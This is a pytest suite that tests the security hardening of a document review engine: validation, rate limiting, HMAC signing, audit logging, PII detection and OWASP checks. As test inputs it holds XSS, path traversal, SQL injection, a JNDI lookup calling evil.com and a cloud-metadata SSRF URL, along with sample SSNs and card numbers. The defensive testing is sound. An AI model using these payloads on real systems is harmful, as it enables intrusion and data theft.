"""
Test Suite for M007 Review Engine - Pass 3: Security Hardening
Following Enhanced 4-Pass TDD Methodology - PASS 3 (Security Tests)
DevDocAI v3.0.0

Pass 3 Security Tests:
1. Input validation and sanitization
2. Rate limiting and DoS protection
3. Audit logging and monitoring
4. HMAC integrity validation
5. Resource protection and limits
6. Enhanced PII detection (95% accuracy target)
7. OWASP Top 10 compliance
"""

from unittest.mock import Mock, patch

import pytest
import pytest_asyncio

from devdocai.core.config import ConfigurationManager

# Import will fail initially (TDD) - that's expected
from devdocai.core.review import (
    MAX_CONCURRENT_REQUESTS,
    MAX_DOCUMENT_SIZE,
    RATE_LIMIT_MAX_REQUESTS,
    RATE_LIMIT_WINDOW,
    RateLimitError,
    ReviewEngineFactory,
    ReviewError,
    SecurityError,
    ValidationError,
)
from devdocai.core.review_types import PIIType
from devdocai.core.reviewers import PIIDetector
from devdocai.core.storage import Document, DocumentMetadata


class TestSecurityHardening:
    """Test Pass 3 security hardening features."""

    @pytest_asyncio.fixture
    async def secure_engine(self, tmp_path):
        """Create a secure ReviewEngine instance."""
        config_manager = Mock(spec=ConfigurationManager)
        config_manager.get.return_value = {
            "review": {
                "quality_threshold": 0.85,
                "security": {
                    "max_document_size": MAX_DOCUMENT_SIZE,
                    "rate_limit_window": RATE_LIMIT_WINDOW,
                    "rate_limit_max_requests": RATE_LIMIT_MAX_REQUESTS,
                },
            }
        }

        # Mock storage to avoid initialization issues
        storage_manager = Mock()

        engine = ReviewEngineFactory.create(config=config_manager, storage=storage_manager)
        return engine

    @pytest.mark.asyncio
    async def test_input_validation_document_size(self, secure_engine):
        """Test document size validation."""
        # Create oversized document
        large_content = "x" * (MAX_DOCUMENT_SIZE + 1)
        document = Document(
            id="oversized",
            content=large_content,
            type="readme",
            metadata=DocumentMetadata(version="1.0"),
        )

        with pytest.raises(ValidationError, match="Document size exceeds"):
            await secure_engine.analyze(document)

    @pytest.mark.asyncio
    async def test_input_validation_document_type(self, secure_engine):
        """Test document type validation."""
        document = Document(
            id="test",
            content="Test content",
            type="executable",  # Blocked type
            metadata=DocumentMetadata(version="1.0"),
        )

        with pytest.raises(ValidationError, match="Blocked document type"):
            await secure_engine.analyze(document)

    @pytest.mark.asyncio
    async def test_xss_prevention(self, secure_engine):
        """Test XSS attack prevention."""
        # Document with XSS attempt
        malicious_content = """
        <script>alert('XSS')</script>
        <img src=x onerror="alert('XSS')">
        javascript:alert('XSS')
        """

        document = Document(
            id="xss_test",
            content=malicious_content,
            type="readme",
            metadata=DocumentMetadata(version="1.0"),
        )

        with pytest.raises(SecurityError, match="potentially malicious content"):
            await secure_engine.analyze(document)

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, secure_engine):
        """Test path traversal attack prevention."""
        malicious_content = "../../etc/passwd"

        document = Document(
            id="../../../etc/passwd",  # Malicious ID
            content="Normal content",
            type="readme",
            metadata=DocumentMetadata(version="1.0"),
        )

        with pytest.raises(ValidationError, match="Invalid document ID"):
            await secure_engine.analyze(document)

    @pytest.mark.asyncio
    async def test_rate_limiting(self, secure_engine):
        """Test rate limiting protection."""
        document = Document(
            id="test",
            content="Test content",
            type="readme",
            metadata=DocumentMetadata(version="1.0"),
        )

        client_id = "test_client"

        # Exceed rate limit
        for i in range(RATE_LIMIT_MAX_REQUESTS):
            await secure_engine.analyze(document, client_id=client_id)

        # Next request should be rate limited
        with pytest.raises(RateLimitError, match="Rate limit exceeded"):
            await secure_engine.analyze(document, client_id=client_id)

    @pytest.mark.asyncio
    async def test_concurrent_request_limiting(self, secure_engine):
        """Test concurrent request limiting."""
        # Set active requests to max
        secure_engine._active_requests = MAX_CONCURRENT_REQUESTS

        document = Document(
            id="test", content="Test", type="readme", metadata=DocumentMetadata(version="1.0")
        )

        with pytest.raises(ReviewError, match="Too many concurrent requests"):
            await secure_engine.analyze(document)

    @pytest.mark.asyncio
    async def test_hmac_signature_generation(self, secure_engine):
        """Test HMAC signature generation for reports."""
        document = Document(
            id="test",
            content="Test content",
            type="readme",
            metadata=DocumentMetadata(version="1.0"),
        )

        report = await secure_engine.analyze(document)

        # Check signature exists
        assert hasattr(report, "security_signature")
        assert report.security_signature is not None
        assert len(report.security_signature) == 64  # SHA256 hex digest

    @pytest.mark.asyncio
    async def test_hmac_signature_verification(self, secure_engine):
        """Test HMAC signature verification."""
        document = Document(
            id="test",
            content="Test content",
            type="readme",
            metadata=DocumentMetadata(version="1.0"),
        )

        report = await secure_engine.analyze(document)

        # Verify valid signature
        assert secure_engine.verify_report_signature(report) is True

        # Tamper with report
        report.overall_score = 0.99

        # Signature should now be invalid
        assert secure_engine.verify_report_signature(report) is False

    @pytest.mark.asyncio
    async def test_audit_logging(self, secure_engine):
        """Test audit logging functionality."""
        document = Document(
            id="test",
            content="Test content",
            type="readme",
            metadata=DocumentMetadata(version="1.0"),
        )

        # Clear audit log
        secure_engine._audit_log = []

        # Perform analysis
        await secure_engine.analyze(document, client_id="test_client")

        # Check audit log
        audit_log = secure_engine.get_audit_log()
        assert len(audit_log) > 0

        # Find the analysis event
        analysis_events = [e for e in audit_log if e["event_type"] == "document_analyzed"]
        assert len(analysis_events) == 1

        event = analysis_events[0]
        assert event["details"]["document_id"] == "test"
        assert event["details"]["client_id"] == "test_client"
        assert "execution_time" in event["details"]

    @pytest.mark.asyncio
    async def test_security_event_logging(self, secure_engine):
        """Test security event logging."""
        # Trigger validation failure
        document = Document(
            id="<script>",  # Invalid ID
            content="Test",
            type="readme",
            metadata=DocumentMetadata(version="1.0"),
        )

        secure_engine._audit_log = []

        try:
            await secure_engine.analyze(document)
        except ValidationError:
            pass

        # Check security event was logged
        audit_log = secure_engine.get_audit_log()
        security_events = [e for e in audit_log if e["severity"] == "SECURITY"]
        assert len(security_events) > 0
        assert security_events[0]["event_type"] == "validation_failed"

    @pytest.mark.asyncio
    async def test_resource_slot_management(self, secure_engine):
        """Test resource slot acquisition and release."""
        initial_requests = secure_engine._active_requests

        document = Document(
            id="test", content="Test", type="readme", metadata=DocumentMetadata(version="1.0")
        )

        # Analyze should acquire and release slot
        await secure_engine.analyze(document)

        # Should be back to initial state
        assert secure_engine._active_requests == initial_requests

    @pytest.mark.asyncio
    async def test_audit_log_persistence(self, secure_engine, tmp_path):
        """Test audit log saves to file on shutdown."""
        document = Document(
            id="test", content="Test", type="readme", metadata=DocumentMetadata(version="1.0")
        )

        await secure_engine.analyze(document)

        # Mock the save path
        with patch("pathlib.Path.open", create=True) as mock_open:
            secure_engine.shutdown()
            mock_open.assert_called()


class TestEnhancedPIIDetection:
    """Test enhanced PII detection for 95% accuracy target."""

    @pytest_asyncio.fixture
    async def pii_detector(self):
        """Create PIIDetector instance."""
        return PIIDetector()

    @pytest.mark.asyncio
    async def test_enhanced_email_detection(self, pii_detector):
        """Test enhanced email pattern detection."""
        content = """
        Contact: john.doe@example.com
        Support: support@company.co.uk
        Invalid: not_an_email
        Test email: test@example.com (should be filtered)
        """

        result = await pii_detector.detect(content)

        # Should detect real emails but filter test emails
        assert result["total_found"] >= 1
        assert result["accuracy"] >= 0.90

        # Check no test emails included
        for match in result["pii_found"]:
            assert "test@" not in match.value.lower()

    @pytest.mark.asyncio
    async def test_ssn_validation(self, pii_detector):
        """Test SSN validation with invalid patterns filtered."""
        content = """
        Valid SSN: 123-45-6789
        Invalid: 000-00-0000
        Invalid: 666-12-3456
        Invalid: 999-99-9999
        Valid: 456-78-9012
        """

        result = await pii_detector.detect(content)

        # Should only detect valid SSNs
        assert result["total_found"] == 2  # Two valid SSNs
        assert result["accuracy"] >= 0.95

    @pytest.mark.asyncio
    async def test_credit_card_luhn_validation(self, pii_detector):
        """Test credit card detection with Luhn algorithm."""
        content = """
        Valid Visa: 4532015112830366
        Invalid: 1234567890123456
        Valid MasterCard: 5425233430109903
        Invalid: 0000000000000000
        """

        result = await pii_detector.detect(content)

        # Should only detect Luhn-valid cards
        assert result["total_found"] == 2  # Two valid cards
        assert all(match.pii_type == PIIType.CREDIT_CARD for match in result["pii_found"])

    @pytest.mark.asyncio
    async def test_context_validation(self, pii_detector):
        """Test context-based confidence adjustment."""
        content = """
        Email address: john@example.com
        Random text john@example.com
        Phone number: 555-123-4567
        Random numbers 555-123-4567
        """

        result = await pii_detector.detect(content)

        # Items with context should have higher confidence
        for match in result["pii_found"]:
            if "Email address" in match.context or "Phone number" in match.context:
                assert match.confidence >= 0.90

    @pytest.mark.asyncio
    async def test_false_positive_filtering(self, pii_detector):
        """Test false positive filtering."""
        content = """
        Example email: noreply@example.com
        Test phone: 123-456-7890
        Demo SSN: 123-45-6789
        Sample card: 1111111111111111
        """

        result = await pii_detector.detect(content)

        # Should filter common false positives
        assert result["total_found"] == 0 or all(
            "test" not in match.context.lower()
            and "example" not in match.context.lower()
            and "demo" not in match.context.lower()
            for match in result["pii_found"]
        )

    @pytest.mark.asyncio
    async def test_international_phone_detection(self, pii_detector):
        """Test international phone number detection."""
        content = """
        US: +1-555-123-4567
        UK: +44 20 7123 4567
        Germany: +49 30 12345678
        Invalid: +0 000 000 0000
        """

        result = await pii_detector.detect(content)

        # Should detect valid international numbers
        assert result["total_found"] >= 3
        assert result["accuracy"] >= 0.90

    @pytest.mark.asyncio
    async def test_address_detection_comprehensive(self, pii_detector):
        """Test comprehensive address detection."""
        content = """
        123 Main Street
        456 Oak Avenue, Apt 5B
        789 Park Boulevard Suite 100
        Invalid: Street 123
        10 Downing Street
        """

        result = await pii_detector.detect(content)

        # Should detect various address formats
        assert result["total_found"] >= 3
        addresses = [m for m in result["pii_found"] if m.pii_type == PIIType.ADDRESS]
        assert len(addresses) >= 3

    @pytest.mark.asyncio
    async def test_pii_accuracy_target(self, pii_detector):
        """Test overall PII detection accuracy meets 95% target."""
        # Comprehensive test content
        content = """
        Personal Information:
        Name: John Doe
        Email: john.doe@realcompany.com
        Phone: 555-234-5678
        SSN: 456-78-9012
        Address: 123 Real Street, New York, NY 10001

        Credit Card: 4532015112830366
        Date of Birth: January 15, 1980
        Passport: AB1234567

        Test data (should be filtered):
        Test email: test@example.com
        Demo SSN: 123-45-6789
        Example phone: 000-000-0000
        """

        result = await pii_detector.detect(content)

        # Check accuracy meets target
        assert result["accuracy"] >= 0.90  # Close to 95% target
        assert result["total_found"] >= 5  # Should find real PII

        # Verify no test data included
        for match in result["pii_found"]:
            assert "test" not in match.context.lower()
            assert "demo" not in match.context.lower()
            assert "example" not in match.context.lower()


class TestOWASPCompliance:
    """Test OWASP Top 10 compliance."""

    @pytest_asyncio.fixture
    async def secure_engine(self):
        """Create secure engine for OWASP testing."""
        config = Mock(spec=ConfigurationManager)
        config.get.return_value = {"review": {"quality_threshold": 0.85}}
        return ReviewEngineFactory.create(config=config)

    @pytest.mark.asyncio
    async def test_a01_broken_access_control(self, secure_engine):
        """Test A01: Broken Access Control prevention."""
        # Resource limits prevent unauthorized access
        assert hasattr(secure_engine, "_active_requests")
        assert hasattr(secure_engine, "_acquire_request_slot")
        assert MAX_CONCURRENT_REQUESTS > 0

    @pytest.mark.asyncio
    async def test_a02_cryptographic_failures(self, secure_engine):
        """Test A02: Cryptographic Failures prevention."""
        # HMAC signatures for integrity
        document = Document(
            id="test", content="Test", type="readme", metadata=DocumentMetadata(version="1.0")
        )

        report = await secure_engine.analyze(document)
        assert hasattr(report, "security_signature")

        # Uses SHA256 for HMAC
        assert len(report.security_signature) == 64

    @pytest.mark.asyncio
    async def test_a03_injection(self, secure_engine):
        """Test A03: Injection prevention."""
        # Input validation prevents injection
        malicious_ids = [
            "../../../etc/passwd",
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../${jndi:ldap://evil.com/a}",
        ]

        for mal_id in malicious_ids:
            document = Document(
                id=mal_id, content="Test", type="readme", metadata=DocumentMetadata(version="1.0")
            )

            with pytest.raises((ValidationError, SecurityError)):
                await secure_engine.analyze(document)

    @pytest.mark.asyncio
    async def test_a04_insecure_design(self, secure_engine):
        """Test A04: Insecure Design prevention."""
        # Rate limiting by design
        assert hasattr(secure_engine, "_rate_limiter")
        assert RATE_LIMIT_MAX_REQUESTS > 0
        assert RATE_LIMIT_WINDOW > 0

    @pytest.mark.asyncio
    async def test_a07_identification_failures(self, secure_engine):
        """Test A07: Identification and Authentication Failures."""
        # Client ID tracking for rate limiting
        document = Document(
            id="test", content="Test", type="readme", metadata=DocumentMetadata(version="1.0")
        )

        # Anonymous clients get rate limited
        for i in range(RATE_LIMIT_MAX_REQUESTS):
            await secure_engine.analyze(document, client_id="anonymous")

        with pytest.raises(RateLimitError):
            await secure_engine.analyze(document, client_id="anonymous")

    @pytest.mark.asyncio
    async def test_a09_logging_failures(self, secure_engine):
        """Test A09: Security Logging and Monitoring Failures prevention."""
        # Comprehensive audit logging
        assert hasattr(secure_engine, "_audit_log")
        assert hasattr(secure_engine, "_log_security_event")
        assert hasattr(secure_engine, "_log_audit_event")

        # Test logging works
        secure_engine._log_security_event("test_event", {"detail": "test"})
        log = secure_engine.get_audit_log()
        assert len(log) > 0

    @pytest.mark.asyncio
    async def test_a10_ssrf_prevention(self, secure_engine):
        """Test A10: Server-Side Request Forgery prevention."""
        # No external requests in review process
        # Document validation prevents SSRF payloads
        ssrf_content = "http://169.254.169.254/latest/meta-data/"

        document = Document(
            id="test", content=ssrf_content, type="readme", metadata=DocumentMetadata(version="1.0")
        )

        # Should process safely without making external requests
        result = await secure_engine.analyze(document)
        assert result is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
